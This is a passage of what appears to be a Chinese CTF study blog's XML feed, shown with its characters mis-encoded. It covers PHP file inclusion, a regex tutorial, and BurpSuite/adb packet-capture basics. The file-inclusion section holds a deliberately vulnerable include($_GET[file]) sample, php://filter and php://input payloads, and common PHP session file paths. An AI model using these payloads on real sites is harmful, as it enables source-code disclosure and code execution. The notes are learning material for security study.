è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°å¾ˆæ˜¯æœ‰ç”¨ï¼Œç›¸ä¼¼ <code>readfile()</code>ã€<code>file()</code>å’Œ<code>file_get_contents()</code>ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä»¥å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä½™è¿‡æ»¤å™¨ã€‚</p><p><code>php://filter</code>ç›®æ ‡ä½¿ç”¨å¦‚ä¸‹çš„å‚æ•°åšä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚è¯¦ç»†ä½¿ç”¨è¿™äº›å‚æ•°èƒ½å¤Ÿå‚è€ƒå…·ä½“èŒƒä¾‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203954389.png" alt="image-20210208203954389"></p></li><li><p>ä½¿ç”¨æ¡ä»¶</p><ol><li>allow_url_include = Off/On #æ— è¦æ±‚</li></ol></li><li><p>èŒƒä¾‹</p><p>ç¯å¢ƒï¼š</p><pre class="line-numbers language-none"><code class="language-none">//filter.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åº”ç”¨ï¼š</p><pre class="line-numbers language-none"><code class="language-none">//payload[GAT DATA 1]:    filter.php?file=php://filter/read=convert.base64-encode/resource=filter.php  [GET DATA 2]:    filter.php?file=php://filter/convert.base64-encode/resource=filter.php  [GAT DATA 3]:    filter.php?file=php://filter/resource=php://input    [POST DATA]:    &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åŒ…å«session"><a href="#åŒ…å«session" class="headerlink" title="åŒ…å«session"></a>åŒ…å«session</h3></li></ul><p>ç®€ä»‹<br>PHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„è®¾ç½®ã€‚Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œè€Œä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„å…¨éƒ¨é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ã€‚åœ¨æ‚¨æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° PHP session ä¸­ä»¥å‰ï¼Œé¦–å…ˆå¿…é¡»ä½¿ç”¨<code>session_start()</code>å¯åŠ¨ä¼šè¯ã€‚<br>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„èƒ½å¤Ÿå†phpinfoçš„session.save_pathæŸ¥è¯¢åˆ°<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203749051.png" alt="image-20210208203749051"><br>å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®ï¼š</p><pre class="line-numbers language-none"><code class="language-none">/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sessionçš„æ–‡ä»¶åæ ¼å¼ä¸ºsess_[phpsessid]ã€‚è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­èƒ½å¤Ÿçœ‹åˆ°ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h3><p>æœ€è¿‘åœ¨å¤ä¹ ï¼Œè‡ªå·±phpçš„é¢˜ç›®åšçš„è¿˜æ¯”è¾ƒå°‘ï¼Œåªå®è·µäº†éƒ¨åˆ†phpæ¼æ´ã€‚</p><p>åœ¨æ•´ç†æ¼æ´çš„è¿‡ç¨‹ä¸­å‘ç°ä¸€äº›æ¼æ´å¯¹äºæˆ‘æ¥è¯´æ˜¯éå¸¸é™Œç”Ÿçš„ï¼Œåœ¨æ•´ç†çš„è¿‡ç¨‹ä¸­ä¹Ÿæ‹“å®½äº†è‡ªå·±çš„è§†é‡ã€‚</p><p>æœ€è¿‘php8ä¹Ÿå‘å¸ƒäº†ï¼Œä¸€äº›æ¼æ´è¯´ä¸å®šå·²ç»è¿‡æ—¶ï¼Œåˆä¼šå‡ºç°æ–°çš„æ¼æ´ã€‚åªæœ‰ä¸æ–­çš„å­¦ä¹ æ‰èƒ½é€‚åº”è¿™ä¸ªå¿«é€Ÿå‘å±•çš„æ—¶ä»£ï¼</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ </title>
      <link href="2020/web-ji-chu/zheng-ze-biao-da-shi-xue-xi/"/>
      <url>2020/web-ji-chu/zheng-ze-biao-da-shi-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æ¦‚å¿µï¼š</p><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¯¹å­—ç¬¦ä¸²æ“ä½œçš„ä¸€ç§é€»è¾‘å…¬å¼ï¼Œå°±æ˜¯ç”¨äº‹å…ˆå®šä¹‰å¥½çš„ä¸€äº›ç‰¹å®šå­—ç¬¦ã€åŠè¿™äº›ç‰¹å®šå­—ç¬¦çš„ç»„åˆï¼Œç»„æˆä¸€ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ï¼Œè¿™ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ç”¨æ¥è¡¨è¾¾å¯¹å­—ç¬¦ä¸²çš„ä¸€ç§è¿‡æ»¤é€»è¾‘ã€‚</p><p>ç®€ä»‹ï¼š</p><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¯¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬æ™®é€šå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œa åˆ° z ä¹‹é—´çš„å­—æ¯ï¼‰å’Œç‰¹æ®Šå­—ç¬¦ï¼ˆç§°ä¸ºâ€œå…ƒå­—ç¬¦â€ï¼‰ï¼‰æ“ä½œçš„ä¸€ç§é€»è¾‘å…¬å¼ï¼Œå°±æ˜¯ç”¨äº‹å…ˆå®šä¹‰å¥½çš„ä¸€äº›ç‰¹å®šå­—ç¬¦ã€åŠè¿™äº›ç‰¹å®šå­—ç¬¦çš„ç»„åˆï¼Œç»„æˆä¸€ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ï¼Œè¿™ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ç”¨æ¥è¡¨è¾¾å¯¹å­—ç¬¦ä¸²çš„ä¸€ç§è¿‡æ»¤é€»è¾‘ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§æ–‡æœ¬æ¨¡å¼ï¼Œè¯¥æ¨¡å¼æè¿°åœ¨æœç´¢æ–‡æœ¬æ—¶è¦åŒ¹é…çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ã€‚                       â€”â€”æ‘˜è‡ªç™¾åº¦ç™¾ç§‘</p><p>é‚£ä¹ˆå®ƒçš„åŠŸèƒ½æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æˆ‘çš„ç†è§£å°±æ˜¯è¿›è¡Œå­—ç¬¦ä¸²çš„åŒ¹é…éªŒè¯ï¼ŒæŸ¥æ‰¾æ›¿æ¢ï¼Œåˆ†å‰²æˆªå–ä¹‹ç±»çš„</p><p>å®ƒçš„ç»„æˆï¼š</p><ul><li><p>  1.æ™®é€šå­—ç¬¦ï¼šé™¤äº†å…ƒå­—ç¬¦ä¹‹å¤–çš„å¯æ‰“å°å’Œä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¸€èˆ¬éƒ½æ˜¯ç®€å•çš„åŒ¹é…è‡ªèº«ï¼Œæ¯”å¦‚helloåŒ¹é…â€˜hello</p></li><li><p>  2.å…ƒå­—ç¬¦ ï¼šé™¤äº†æ™®é€šå­—ç¬¦è¿›è¡Œçš„ç¡®åˆ‡çš„åŒ¹é…ä¹‹å¤–,è¿˜éœ€è¦è¿›è¡Œä¸€äº›æ¨¡ç³ŠåŒ¹é…,æ‰€ä»¥éœ€è¦ä¸€äº›ç‰¹æ®Šå­—ç¬¦æ¥è¡¨ç¤ºå¦‚: .   [ ] (  ) * + ? ^ $ \ |  å¦‚éœ€è¦å¯¹è¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒåŒ¹é…åªéœ€è¦è¿›è¡Œè½¬ä¹‰å³å¯</p></li></ul><h2 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h2><table><thead><tr><th align="center">å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">\</td><td>è½¬ä¹‰å­—ç¬¦</td></tr><tr><td align="center">^</td><td>åŒ¹é…å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®</td></tr><tr><td align="center">$</td><td>åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾çš„ä½ç½®</td></tr><tr><td align="center">.</td><td>åŒ¹é…é™¤æ¢è¡Œç¬¦ï¼ˆ\nã€\rï¼‰ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ï¼Œç›¸ç­‰äºã€^\n\rã€‘</td></tr><tr><td align="center">|</td><td>æˆ–</td></tr><tr><td align="center">[]</td><td>å­—ç¬¦é›†åˆ,å¯ä»¥å’Œä¸Šé¢çš„å­—ç¬¦é…åˆèµ·æ¥ä½¿ç”¨</td></tr><tr><td align="center">()</td><td>åˆ†ç»„</td></tr><tr><td align="center">*</td><td><strong>é›¶æ¬¡æˆ–å¤šæ¬¡</strong>åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼</td></tr><tr><td align="center">+</td><td><strong>ä¸€æ¬¡æˆ–å¤šæ¬¡</strong>åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼</td></tr><tr><td align="center">?</td><td><strong>é›¶æ¬¡æˆ–ä¸€æ¬¡</strong>åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼</td></tr><tr><td align="center">{n}</td><td>æŒ‡å®šåŒ¹é…çš„æ¬¡æ•°, æ¯”å¦‚m{2}ä¸èƒ½åŒ¹é…â€œamyâ€œ,åªèƒ½åŒ¹é…â€œammyâ€</td></tr><tr><td align="center">{n,}</td><td>è‡³å°‘åŒ¹é…çš„æ¬¡æ•°, æ¯”å¦‚m{2}ä¸èƒ½åŒ¹é…â€œamyâ€œ,ä½†æ˜¯èƒ½åŒ¹é…â€œammmmmmyâ€, å¦‚m{1,}å¯ä»¥ç”¨m+æ¥è¡¨ç¤º,m{0,}å¯ä»¥ç”¨m*æ¥è¡¨ç¤º,éƒ½æ˜¯ä¸€æ ·çš„æ„æ€</td></tr><tr><td align="center">{n,m}</td><td>åœ¨ä¸Šä¸€ä¸ªçš„åŸºç¡€ä¸Š,é™å®šäº†æœ€å¤šåŒ¹é…å¤šå°‘æ¬¡</td></tr><tr><td align="center">?</td><td>?å‡ºç°åœ¨ä¸Šé¢6ä¸ªé™å®šç¬¦ä¹‹å,åˆ™é˜»æ­¢å®ƒä»¬è¿›è¡Œè´ªå©ªåŒ¹é…, æ¯”å¦‚å¯¹äºaaaaaa, a+?åªåŒ¹é…ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸², è€Œa+å…¨éƒ½åŒ¹é…</td></tr><tr><td align="center">\b (boundary)</td><td>åŒ¹é…å•è¯è¾¹ç•Œ, å¦‚er\båªèƒ½åŒ¹é…neveré‡Œé¢çš„er,ä½†ä¸èƒ½åŒ¹é…verbä¸­çš„er</td></tr><tr><td align="center">\B</td><td>åŒ¹é…éå•è¯è¾¹ç•Œ, å’Œä¸Šé¢ç›¸å</td></tr><tr><td align="center">\cx</td><td>cè¡¨ç¤ºé”®ç›˜è¾“å…¥control,xè¡¨ç¤ºé”®ç›˜ä¸Šçš„æ‰€æœ‰å¤§å°å†™å­—æ¯,å¦‚\cC è¡¨ç¤ºctrl+c</td></tr><tr><td align="center">\d      (digit)</td><td>åŒ¹é…ä¸€ä¸ªæ•°å­—</td></tr><tr><td align="center">\f</td><td>æ¢é¡µç¬¦</td></tr><tr><td align="center">\n</td><td>æ¢è¡Œç¬¦</td></tr><tr><td align="center">\s</td><td>åŒ¹é…ç©ºå­—ç¬¦</td></tr><tr><td align="center">\S</td><td>åŒ¹é…éç©ºå­—ç¬¦</td></tr><tr><td align="center">\t</td><td>åŒ¹é…æ°´å¹³åˆ¶è¡¨ç¬¦</td></tr><tr><td align="center">\v</td><td>åŒ¹é…å‚ç›´åˆ¶è¡¨ç¬¦</td></tr><tr><td align="center">\w</td><td>åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº[A-Za-z0-9_]</td></tr><tr><td align="center">\W</td><td>åŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº [^A-Za-z0-9_]</td></tr><tr><td align="center">\xn</td><td>åŒ¹é… nï¼Œå…¶ä¸­ n ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œâ€™\x41â€™ åŒ¹é… â€œAâ€ã€‚â€™\x041â€™ åˆ™ç­‰ä»·äº â€˜\x04â€™ &amp; â€œ1â€ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ ASCII ç¼–ç ã€‚</td></tr><tr><td align="center">\num</td><td>åŒ¹é… numï¼Œå…¶ä¸­ num æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€™(.)\1â€™ åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td></tr><tr><td align="center">\n</td><td>æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ \n ä¹‹å‰è‡³å°‘ n ä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™ n ä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™ n ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚</td></tr><tr><td align="center">\nml</td><td>å¦‚æœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-3)ï¼Œä¸” m å’Œ l å‡ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼ nmlã€‚</td></tr><tr><td align="center">\un</td><td>åŒ¹é… nï¼Œå…¶ä¸­ n æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„ Unicode å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \u00A9 åŒ¹é…ç‰ˆæƒç¬¦å· (?)ã€‚</td></tr></tbody></table><h2 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h2><table><thead><tr><th align="center">ä¿®é¥°ç¬¦</th><th>å«ä¹‰</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">i</td><td>ignore - ä¸åŒºåˆ†å¤§å°å†™</td><td>å°†åŒ¹é…è®¾ç½®ä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™: A å’Œ a æ²¡æœ‰åŒºåˆ«ã€‚</td></tr><tr><td align="center">g</td><td>global - å…¨å±€åŒ¹é…</td><td>æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹ã€‚</td></tr><tr><td align="center">m</td><td>multi line - å¤šè¡ŒåŒ¹é…</td><td>ä½¿è¾¹ç•Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œæ˜¯å¤šè¡Œ!ï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚</td></tr><tr><td align="center">s</td><td>ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ <strong>\n</strong></td><td>é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ <strong>.</strong> æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ <strong>\n</strong> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼ŒåŠ ä¸Š <strong>s</strong> ä¿®é¥°ç¬¦ä¹‹å, <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ \nã€‚</td></tr></tbody></table><h2 id="å…ˆè¡Œæ–­è¨€"><a href="#å…ˆè¡Œæ–­è¨€" class="headerlink" title="å…ˆè¡Œæ–­è¨€"></a>å…ˆè¡Œæ–­è¨€</h2><table><thead><tr><th align="left">å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td align="left">a(?=b)</td><td>å…ˆè¡Œæ–­è¨€,aåœ¨bå‰é¢æ‰ä¼šåŒ¹é…</td></tr><tr><td align="left">a(?!b)</td><td>å…ˆè¡Œå¦å®šæ–­è¨€,aä¸åœ¨bå‰é¢æ‰ä¼šåŒ¹é…</td></tr></tbody></table><h2 id="åè¡Œæ–­è¨€"><a href="#åè¡Œæ–­è¨€" class="headerlink" title="åè¡Œæ–­è¨€"></a>åè¡Œæ–­è¨€</h2><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>(?&lt;=b)a</td><td>åè¡Œæ–­è¨€,aåªæœ‰åœ¨båé¢æ‰åŒ¹é…</td></tr><tr><td>(?&lt;!b)a</td><td>åè¡Œå¦å®šæ–­è¨€,aåªæœ‰ä¸åœ¨båé¢æ‰è¿›è¡ŒåŒ¹é…</td></tr></tbody></table><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="æ¥åŒ¹é…ä¸ªé‚®ç®±å§"><a href="#æ¥åŒ¹é…ä¸ªé‚®ç®±å§" class="headerlink" title="æ¥åŒ¹é…ä¸ªé‚®ç®±å§"></a>æ¥åŒ¹é…ä¸ªé‚®ç®±å§</h3><pre class="line-numbers language-none"><code class="language-none">/^([\w-.]*)@([A-Za-z0-9]+).([A-Za-z]{2,10})$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208204051643.png" alt="image-20210208204051643"></p><p>å‘ç°æœ‰å½¢å¦‚edu.cnçš„åŒ¹é…ä¸äº†äº†â€¦..æŠŠ.æ”¾è¿›å»å°±å¯ä»¥äº†</p><pre class="line-numbers language-none"><code class="language-none">/^([\w-.]*)([@A-Za-z0-9]+\.)+([A-Za-z]{2,10})$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208204105174.png" alt="image-20210208204105174"></p><p>åº”è¯¥éƒ½æ˜¯èƒ½åŒ¹é…ä¸Šçš„,åŒ¹é…çš„æœ‰äº›è®¸çš„ç²—ç³™,ç›®å‰åªä¼šå†™ä¸€ç‚¹ç®€å•çš„</p><h3 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h3><p>æ ¹æ®IPåœ°å€çš„ç‰¹ç‚¹,å¯ä»¥å†™å‡ºä¸‹é¢çš„æ­£åˆ™æ¥åŒ¹é…</p><pre class="line-numbers language-none"><code class="language-none">/^(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208204426135.png" alt="image-20210208204426135"></p><h3 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h3><pre class="line-numbers language-none"><code class="language-none">/^\[(\d+)\/(\w+)\/(\d+):(\d+):(\d+):(\d+)\s\+(\d+)\]$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208204313878.png" alt="image-20210208204313878"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹äºæ­£åˆ™è¡¨è¾¾å¼è‡ªå·±åªå­¦ä¼šäº†ä¸€äº›çš®æ¯›ï¼Œä¸å»ç»ƒä¼šå„¿è¿‡äº†ä¸€æ®µæ—¶é—´å¾ˆå®¹æ˜“å°±å¿˜æ‰äº†ã€‚</p><p>åœ¨ä¸€äº›ctfçš„é¢˜ç›®ä¸­ä¼šé‡è§ä¸€äº›è€é•¿è€é•¿çš„æ­£åˆ™è®©ä½ å»åŒ¹é…ï¼Œå‘ç°æ¯æ¬¡ä¸€ç‚¹ä¸€ç‚¹å»å†™å¤ªæµªè´¹æ—¶é—´äº†ï¼Œæƒ³ä¸€ä¸‹åº”è¯¥ä¼šæœ‰ä¸€äº›è„šæœ¬å¯ä»¥æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼åå‘ç”Ÿæˆç›¸åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œä¸€æŸ¥å‘ç°å„ç§è¯­è¨€éƒ½æœ‰ç›¸åº”çš„åº“å¯ä»¥è°ƒç”¨ç”¨æ¥ç”ŸæˆåŒ¹é…çš„å­—ç¬¦ä¸²å¦‚pythonçš„<a href="https://github.com/crdoconnor/xeger">xeger</a>å’Œ<a href="https://github.com/asciimoo/exrex">exrex</a>ç­‰ï¼Œjavaä¹Ÿæœ‰<a href="https://github.com/bluezio/xeger">xeger</a>å·¥å…·åŒ…å¯ä»¥ç”¨</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webåŸºç¡€</title>
      <link href="2020/web-ji-chu/web-ji-chu/"/>
      <url>2020/web-ji-chu/web-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="BurpSuiteçš„ä½¿ç”¨"><a href="#BurpSuiteçš„ä½¿ç”¨" class="headerlink" title="BurpSuiteçš„ä½¿ç”¨"></a>BurpSuiteçš„ä½¿ç”¨</h2><h3 id="æŠ“ç½‘é¡µçš„åŒ…"><a href="#æŠ“ç½‘é¡µçš„åŒ…" class="headerlink" title="æŠ“ç½‘é¡µçš„åŒ…"></a>æŠ“ç½‘é¡µçš„åŒ…</h3><p>1.é…ç½®ç«¯å£å’ŒIP</p><p>2.å¯¼å…¥è¯ä¹¦(æŠ“https)</p><p>3.æµè§ˆå™¨å¼€å¯BPçš„ä»£ç†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208193831482.png" alt="image-20210208193831482"></p><h3 id="æŠ“APPå’Œå¾®ä¿¡å°ç¨‹åºçš„åŒ…"><a href="#æŠ“APPå’Œå¾®ä¿¡å°ç¨‹åºçš„åŒ…" class="headerlink" title="æŠ“APPå’Œå¾®ä¿¡å°ç¨‹åºçš„åŒ…"></a>æŠ“APPå’Œå¾®ä¿¡å°ç¨‹åºçš„åŒ…</h3><p>æŠ“APPçš„åŒ…å’Œç”µè„‘å·®ä¸å¤š</p><p>å‘ç°ç°åœ¨æ–°ç‰ˆçš„å¾®ä¿¡æŠ“å°ç¨‹åºçš„åŒ…ä¼šç›´æ¥é—ªé€€</p><p>But,ç™»ä¸Šå»çš„æ—¶å€™å±…ç„¶å«æˆ‘æ›´æ–°?è¿™ä¸é™·å…¥æ­»å¾ªç¯äº†å—ğŸ˜</p><p>ä¸è¿‡æƒ³ä¸€ä¸‹,å¯ä»¥å…ˆç™»æ–°ç‰ˆçš„å¾®ä¿¡ç„¶åç»™å®ƒå¸äº†,ç•™ç€å®ƒçš„ç™»å½•æ•°æ®,å†ä¸‹ä¸ªè€ç‰ˆçš„å›æ¥å‘€ï¼</p><pre class="line-numbers language-none"><code class="language-none">adb shell pm unstall -k com.tencent.mmadb install -r -d  //+apkè·¯å¾„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”¨adbæŠŠè¿™ä¸ªåˆ äº†,ç„¶åé€šè¿‡adbå®‰è£…æ—§ç‰ˆå¾®ä¿¡</p><p><img src="https://gitee.com/wxs211/image/raw/master/img/image-20201114194025659.png" alt="image-20201114194025659"></p><p>æŠ“åˆ°æ¬¢ä¹æ–—åœ°ä¸»å°ç¨‹åºçš„åŒ…å•¦!</p><h2 id="ç½‘ç«™æ¶æ„"><a href="#ç½‘ç«™æ¶æ„" class="headerlink" title="ç½‘ç«™æ¶æ„"></a>ç½‘ç«™æ¶æ„</h2><h4 id="1-æ“ä½œç³»ç»Ÿ"><a href="#1-æ“ä½œç³»ç»Ÿ" class="headerlink" title="1.æ“ä½œç³»ç»Ÿ"></a>1.æ“ä½œç³»ç»Ÿ</h4><p>Windows,Linux,Macé‚£æ€ä¹ˆåˆ¤æ–­ä¸€ä¸ªç½‘ç«™è¿è¡Œåœ¨ä»€ä¹ˆç³»ç»Ÿä¸Šå‘¢?</p><p>ä¸€ä¸ªå°ç»†èŠ‚==windowså¤§å°å†™ä¸æ•æ„Ÿ,è€ŒLinuxå¤§å°å†™æ˜¯æ•æ„Ÿçš„==,æ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹url,çœ‹æ˜¯å¦æŠ¥é”™æ¥åˆ¤æ–­ç³»ç»Ÿ,å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æŠ“åŒ…æ¥çœ‹å•¦ã€‚</p><h4 id="2-æ­å»ºå¹³å°ï¼ˆæœåŠ¡å™¨è½¯ä»¶ï¼‰"><a href="#2-æ­å»ºå¹³å°ï¼ˆæœåŠ¡å™¨è½¯ä»¶ï¼‰" class="headerlink" title="2.æ­å»ºå¹³å°ï¼ˆæœåŠ¡å™¨è½¯ä»¶ï¼‰"></a>2.æ­å»ºå¹³å°ï¼ˆæœåŠ¡å™¨è½¯ä»¶ï¼‰</h4><p>æœ‰iis apache tomcat nginxç­‰ä¸€äº›</p><h4 id="3-è„šæœ¬è¯­è¨€"><a href="#3-è„šæœ¬è¯­è¨€" class="headerlink" title="3.è„šæœ¬è¯­è¨€"></a>3.è„šæœ¬è¯­è¨€</h4><p>asp php jsp aspxç­‰ã€‚ã€‚ã€‚ã€‚</p><p>é‚£æ€ä¹ˆçœ‹ç›®æ ‡ç½‘ç«™ç”¨çš„å•¥è„šæœ¬è¯­è¨€å‘¢ï¼Ÿ</p><p>é¦–å…ˆä¸€ç›®äº†ç„¶çš„å°±æ˜¯é€šè¿‡URLçœ‹å•¦ï¼Œä¸¾ä¸ªåˆ—å­</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194256410.png" alt="image-20210208194256410"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194328666.png" alt="image-20210208194328666"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œçˆ¬è™«ï¼Œæœç´¢å¼•æ“ï¼Œè¿˜æœ‰ä¸€äº›ä¸“é—¨çš„å·¥å…·æ¥æŸ¥çœ‹</p><h4 id="4-æ•°æ®åº“"><a href="#4-æ•°æ®åº“" class="headerlink" 